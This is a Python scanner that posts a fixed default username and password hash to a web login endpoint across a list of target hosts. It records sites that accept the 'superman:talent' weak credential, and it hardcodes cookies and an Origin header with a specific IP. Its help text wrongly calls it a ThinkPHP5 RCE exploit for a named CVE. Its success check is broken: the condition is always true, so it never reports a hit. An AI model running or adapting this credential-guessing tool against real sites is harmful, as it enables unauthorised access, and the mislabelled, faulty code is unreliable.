import argparse
import textwrap

import requests


def main(url):
    full_url = f"{url}/?module=page_frame&action=login&random=0.8886257442893474"
    cookies = {"PHPSESSID": "cb0ih8iksd31ush09b8m2rl795", "username": "superman", "language": "cn"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
               "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
               "X-Requested-With": "XMLHttpRequest", "Origin": "https://220.179.94.217:9443",
               "Referer": "https://220.179.94.217:9443/?module=login", "Sec-Fetch-Dest": "empty",
               "Sec-Fetch-Mode": "cors",
               "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
    data = {"name": "superman", "password": "'Mm6mPuCI7zszZP4LyaWCMA=='", "language": "cn"}
    try:
        response = requests.post(full_url, headers=headers, cookies=cookies, data=data, allow_redirects=False,
                                 verify=False,
                                 timeout=5)
    except Exception:
        print(f'{url}登录超时')
        return
    if '用户名或密码错误' or '账户被锁定,请稍后重试' in response.text:
        print(f'[-]{url}登录失败')
    else:
        print(f'[+]{url}登录成功')
        return url


if __name__ == '__main__':
    banner = """ 
      ____ _____    _________.__.
    _/ __ \\__  \  /  ___<   |  |
    \  ___/ / __ \_\___ \ \___  |
     \___  >____  /____  >/ ____|
         \/     \/     \/ \/  
    """
    print(banner)
    parser = argparse.ArgumentParser(description='thinkphp5 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            cve-2022-4334-rce.py -u http://192.168.1.108
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="example: -f host.txt")
    args = parser.parse_args()
    if args.file:
        res_url = []
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = main(line.strip())
                if url:
                    res_url.append(url)
        with open("result1.txt", mode="w", encoding="u8") as f:
            for i in res_url:
                f.write(f"{i}存在弱口令 superman:talent\n")
    else:
        main(args.url)
